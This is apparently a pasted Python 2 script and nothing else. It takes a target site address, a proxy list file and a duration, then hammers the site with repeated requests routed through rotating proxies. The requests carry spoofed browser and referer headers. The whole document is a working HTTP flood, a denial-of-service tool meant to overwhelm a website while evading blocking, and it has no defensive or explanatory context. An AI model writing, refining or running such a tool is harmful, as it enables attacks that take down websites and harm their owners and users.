paste.body:
import socket
import urllib2
import time
import sys
site = raw_input("Site Address(http://google.com/): ")
proxies_location = raw_input("HTTP Proxy File Location(proxies.txt): ")
duration = raw_input("Duration In Seconds(100): ")
t_end = time.time() + int(duration)

while time.time() < t_end:
	with open(proxies_location, 'r') as handle:
		for line in handle:
			if time.time() < t_end:
				proxy = urllib2.ProxyHandler({'http': line})
				opener = urllib2.build_opener(proxy)
				urllib2.install_opener(opener)
				req = urllib2.Request(site)
				req.add_header('User-Agent', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36')
				req.add_header('Accept', 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8')
				req.add_header('Accept-Language', 'en-US,en;q=0.5')
				req.add_header('Referer', 'http://google.com/search?q=ayy%20lmao')
				req.add_header('Connection', 'keep-alive')
				try:
					urllib2.urlopen(req)
				except Exception :
					print 'Unable to open site or proxy(' + line + ') is dead'
			else:
				sys.exit()
